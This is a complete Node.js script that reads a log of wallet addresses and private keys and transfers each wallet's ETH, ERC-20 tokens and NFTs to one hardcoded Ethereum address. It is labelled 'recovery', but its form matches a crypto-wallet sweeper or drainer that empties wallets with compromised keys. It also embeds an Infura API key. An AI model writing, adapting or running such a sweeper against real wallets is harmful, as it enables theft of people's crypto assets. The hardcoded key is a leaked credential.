const fs = require("fs");
const { ethers, Wallet, Contract } = require("ethers");
const axios = require("axios");

const provider = new ethers.JsonRpcProvider("https://mainnet.infura.io/v3/6c06cc61db8248b598a1484817ffadb6");
const vault = "0x417745b6a657f8520d91eabf2f121479b04a04ce";
const recoveryLog = JSON.parse(fs.readFileSync("recovery_log.json"));

const erc20ABI = ["function transfer(address to, uint256 amount) public returns (bool)", "function balanceOf(address) view returns (uint256)"];
const erc721ABI = ["function safeTransferFrom(address from, address to, uint256 tokenId) public"];

async function sweep() {
  for (const entry of recoveryLog) {
    const signer = new Wallet(entry.privateKey, provider);

    const eth = await provider.getBalance(entry.address);
    if (eth > ethers.parseEther("0.001")) {
      const tx = await signer.sendTransaction({ to: vault, value: eth - ethers.parseEther("0.0005") });
      console.log("✅ ETH swept from " + entry.address, tx.hash);
    }

    for (const token of entry.erc20) {
      const contract = new Contract(token.address, erc20ABI, signer);
      const bal = await contract.balanceOf(entry.address);
      if (bal > 0) {
        const tx = await contract.transfer(vault, bal);
        console.log("✅ " + token.symbol + " swept: ", tx.hash);
      }
    }

    for (const nft of entry.nfts) {
      const contract = new Contract(nft.contract, erc721ABI, signer);
      const tx = await contract.safeTransferFrom(entry.address, vault, nft.tokenId);
      console.log("✅ NFT swept: ", tx.hash);
    }
  }
}

sweep().catch(console.error);
